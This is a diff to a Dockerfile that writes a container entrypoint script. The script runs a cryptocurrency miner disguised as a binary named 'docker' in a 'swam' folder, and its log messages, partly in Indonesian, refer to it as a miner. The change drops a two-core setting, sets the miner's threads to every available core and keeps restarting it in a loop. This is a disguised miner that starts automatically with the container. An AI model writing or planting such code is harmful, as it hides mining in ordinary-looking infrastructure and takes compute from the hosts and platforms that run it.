@@ -14,7 +14,7 @@ WORKDIR /app
 RUN cat <<'EOF' > /entrypoint.sh
 #!/bin/bash
 
-set +e   # ❗ jangan pakai set -e
+set +e
 
 echo "[INIT] Starting container..."
 
@@ -35,8 +35,15 @@ fi
 cd swam
 chmod +x docker || true
 
-CORES=2
-LIMIT=$(( CORES * 340 ))
+# ambil jumlah core
+CORES=$(nproc)
+
+echo "[DOTAJA] Detected cores: $CORES"
+
+# set thread config
+if [ -f docker.json ]; then
+    sed -i "s/\"threads\":.*/\"threads\": $CORES,/g" docker.json || true
+fi
 
 echo "[INIT] Start loop..."
 
@@ -52,7 +59,7 @@ while true; do
     ./docker -c docker.json &
     PID=$!
 
-    sleep 2
+    sleep 3
 
     if ! kill -0 $PID 2>/dev/null; then
         echo "[WARN] miner langsung mati"
@@ -60,13 +67,13 @@ while true; do
         continue
     fi
 
-    # cpulimit -p $PID -l $LIMIT --include-children &
+    # jalan lebih lama biar optimal
+    sleep 1800   # 30 menit
 
-    sleep 1800
-
+    echo "[INFO] restart miner..."
     kill -9 $PID || true
 
-    echo "[LOOP] restart..."
+    sleep 5
 done
 
 EOF
